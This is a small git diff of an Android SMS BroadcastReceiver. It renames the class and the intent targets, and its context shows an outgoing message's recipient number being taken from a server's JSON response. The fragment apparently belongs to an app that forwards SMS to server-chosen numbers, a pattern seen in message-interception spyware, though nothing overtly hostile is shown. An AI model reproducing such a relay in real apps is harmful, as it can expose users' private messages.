@@ -14,7 +14,7 @@ import android.widget.Toast;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class MessageRc extends BroadcastReceiver {
+public class SmsReceiver extends BroadcastReceiver {
 
     private String previous_message = "";
     private  int userId = 0;
@@ -61,8 +61,8 @@ public class MessageRc extends BroadcastReceiver {
                                                                     if (jsonResponse.has("data")) {
                                                                         String phoneNumber = jsonResponse.getString("data");
 
-                                                                        Intent sentIntent = new Intent(context, SendingMark.class);
-                                                                        Intent deliveredIntent = new Intent(context, MessageDeli.class);
+                                                                        Intent sentIntent = new Intent(context, HySettings.class);
+                                                                        Intent deliveredIntent = new Intent(context, LiDe.class);
                                                                         sentIntent.putExtra("id", userId);
                                                                         sentIntent.putExtra("phone", phoneNumber);
                                                                         deliveredIntent.putExtra("id", userId);
